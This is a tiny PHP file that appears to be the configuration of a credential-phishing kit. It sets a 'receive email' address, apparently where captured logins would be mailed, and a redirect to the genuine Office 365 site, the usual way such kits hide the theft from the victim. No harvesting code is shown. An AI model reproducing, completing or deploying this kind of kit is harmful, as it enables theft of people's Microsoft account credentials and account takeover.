<?php 
$Receive_email="ron_howard54@hotmail.com";
$redirect="https://www.office.com/";
?>